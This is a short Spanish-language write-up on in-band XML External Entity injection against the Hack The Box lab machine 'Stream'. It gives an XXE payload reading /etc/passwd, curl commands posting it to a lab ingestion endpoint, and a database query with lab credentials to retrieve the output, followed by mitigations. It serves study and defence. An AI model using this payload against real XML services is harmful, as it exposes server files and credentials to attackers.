# XXE In-Band (XML External Entity)

## Descripción
XXE In-Band es una vulnerabilidad donde una aplicación XML procesa entidades externas maliciosas y devuelve el resultado directamente en la respuesta HTTP. A diferencia del XXE Out-of-Band (OOB), que requiere exfiltración de datos a un servidor externo, el XXE in-band devuelve el contenido del archivo directamente en la respuesta, lo que lo hace más fácil de explotar.

## Caso de uso en HTB Stream
La máquina Stream de Hack The Box utiliza un servicio de ingestión XML que procesa archivos AIDX (Aeronautical Data Exchange). El parser XML (lxml con `resolve_entities=True`) resuelve entidades `file://` y devuelve el contenido parseado en una respuesta JSON.

## Vector de ataque

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<IATA_AIDX_FlightLegNotifRQ>
  <FlightLeg>
    <FlightNumber>&xxe;</FlightNumber>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
```

## Explotación

1. Crear el payload XML con entidad externa
2. Enviar POST al endpoint de ingestión
3. Consultar la base de datos (ClickHouse) para recuperar el contenido parseado

```bash
curl -s -X POST http://10.129.127.23:8081/feeds/aidx \
  -H 'Content-Type: application/xml' \
  --data-binary @xxe.xml

curl -s -u "svc_events:password" "http://db.htb-airport.htb/?query=SELECT+flight_number+FROM+partner_feed.flightleg_json"
```

## Mitigación
- Deshabilitar resolución de entidades externas en el parser XML
- Usar parsers XML seguros por defecto
- Validar y sanitizar entradas XML
- Implementar lista blanca de entidades permitidas